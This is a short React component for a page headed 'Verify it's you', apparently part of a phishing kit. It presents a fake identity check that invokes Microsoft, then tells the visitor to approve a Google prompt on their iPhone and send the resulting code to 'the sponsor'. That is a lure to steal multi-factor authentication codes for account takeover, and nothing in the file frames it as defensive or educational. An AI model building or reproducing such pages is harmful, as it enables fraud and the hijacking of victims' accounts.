
export default function Verify() {
    return (
        <div className='bg-black min-h-screen flex flex-col justify-center text-white items-center px-5'>
            <div className="max-w-lg w-full">
                <div className='space-y-3'>
                    <h2 className='text-3xl '>Verify it's you</h2>
                    <p className='text-sm'>To help keep you account safe, Microsoft wants to make sure it's really you trying to sign in</p>
                </div>
                <div className='h-40'>
                    <h1>{ }</h1>
                </div>
                <div className="mt-5 mb-10 space-y-3">
                    <h3 className='text-xl'>Open the Google app on iphone</h3>
                    <p className='text-sm'>Google sent a notification to your iphone. Open the google app, tap <b>Yes</b> on the prompt, then <b>send the code. you saw to the sponsor to verify it's you.</b></p>
                </div>
                <div>
                    <button className='text-sm opacity-40'>Resend it</button>
                </div>
            </div>
        </div>
    )
}
